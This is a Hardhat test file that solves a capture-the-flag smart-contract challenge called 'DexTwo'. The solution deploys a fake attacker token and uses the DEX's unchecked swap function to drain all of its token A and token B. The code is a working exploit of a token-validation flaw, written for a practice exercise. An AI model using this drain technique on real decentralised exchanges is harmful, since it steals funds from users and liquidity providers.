import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { Contract } from 'ethers';

const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] DexTwo', function () {
  let deployer: SignerWithAddress, attackerWallet: SignerWithAddress;
  let DexTwo: Contract, AToken: Contract, BToken: Contract;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

    [deployer, attackerWallet] = await ethers.getSigners();

    DexTwo = await (
      await ethers.getContractFactory('DexTwo', deployer)
    ).deploy();

    AToken = await (
      await ethers.getContractFactory('SwappableTokenTwo', deployer)
    ).deploy(DexTwo.address, 'A', 'A', 110);

    await AToken.transfer(DexTwo.address, 100);
    await AToken.transfer(attackerWallet.address, 10);

    BToken = await (
      await ethers.getContractFactory('SwappableTokenTwo', deployer)
    ).deploy(DexTwo.address, 'B', 'B', 110);

    await BToken.transfer(DexTwo.address, 100);
    await BToken.transfer(attackerWallet.address, 10);

    await DexTwo.setTokens(AToken.address, BToken.address);
  });

  it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */

    // Stole tokenA
    const DexTwoAttacker = await (
      await ethers.getContractFactory('DexTwoAttacker', attackerWallet)
    ).deploy(1000);

    await DexTwoAttacker.connect(attackerWallet).transfer(DexTwo.address, 100);
    await DexTwoAttacker.connect(attackerWallet).approve(DexTwo.address, 100);

    await DexTwo.connect(attackerWallet).swap(
      DexTwoAttacker.address,
      AToken.address,
      100
    );
    // --------------------------------------------------------------------

    // Stole TokenB
    const DexTwoAttacker2 = await (
      await ethers.getContractFactory('DexTwoAttacker', attackerWallet)
    ).deploy(1000);

    await DexTwoAttacker2.connect(attackerWallet).transfer(DexTwo.address, 100);
    await DexTwoAttacker2.connect(attackerWallet).approve(DexTwo.address, 100);

    await DexTwo.connect(attackerWallet).swap(
      DexTwoAttacker2.address,
      BToken.address,
      100
    );
    // --------------------------------------------------------------------
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    expect(await AToken.balanceOf(DexTwo.address)).to.be.equal(0);
    expect(await BToken.balanceOf(DexTwo.address)).to.be.equal(0);
  });
});
